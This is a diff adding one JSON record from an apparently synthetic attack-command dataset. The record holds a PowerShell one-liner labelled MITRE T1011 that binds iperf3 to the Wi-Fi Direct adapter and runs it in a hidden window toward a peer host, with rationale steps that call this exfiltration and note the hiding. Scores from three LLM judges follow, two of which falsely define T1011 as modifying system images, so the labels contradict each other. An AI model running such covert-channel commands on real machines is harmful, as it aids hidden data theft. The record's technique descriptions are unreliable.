@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$wd=Get-NetAdapter -InterfaceDescription 'Microsoft Wi-Fi Direct Virtual Adapter' -ErrorAction Stop; $ip=(Get-NetIPAddress -InterfaceIndex $wd.ifIndex -AddressFamily IPv4).IPAddress; Start-Process -WindowStyle Hidden -FilePath iperf3.exe -ArgumentList \"-c 192.168.137.2 -p 64222 -B $ip -t 50\"",
+  "explanation": "Uses the Wi\u2011Fi Direct virtual adapter and binds iperf3 to it, sending over a peer\u2011to\u2011peer Wi\u2011Fi Direct link rather than the primary network (T1011).",
+  "rationale_steps": [
+    "Identify the Wi\u2011Fi Direct virtual adapter used for P2P links.",
+    "Get the adapter's assigned IPv4 address.",
+    "Run iperf3 bound to this interface on a high port for exfil.",
+    "Hide the process window to lower casual visibility."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-225e09bc-ce514a45",
+  "source_prompt_hash": "225e09bc",
+  "timestamp_utc": "2025-09-30T08:51:08.571954Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with proper variable assignments, error handling, pipeline operations, balanced parentheses, and correct parameter usage for all cmdlets.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command is technically valid for creating a covert channel over Wi-Fi Direct, it does not align with T1011 (Exfiltration Over Other Network Medium) and has nothing to do with modifying system images or firmware as described in the technique.",
+        "combined_score": 3.5,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T17:46:52.096415Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed, using correct cmdlet syntax, variable assignments, parameter usage, property access, and command separators.",
+        "semantic_score": 1,
+        "semantic_justification": "The command performs network performance testing and is completely misaligned with the claimed MITRE ATT&CK T1011 'Modify System Image' technique, which involves altering OS/firmware images.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T17:47:11.308635Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quoting, valid cmdlets/parameters, and plausible iperf3 flags.",
+        "semantic_score": 0,
+        "semantic_justification": "The command sends traffic bound to a Wi-Fi Direct adapter using iperf3 and does not modify system or firmware images or boot components as described by the technique.",
+        "combined_score": 2.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T17:47:39.234878Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.0,
+    "llm_average_score": 3.0,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
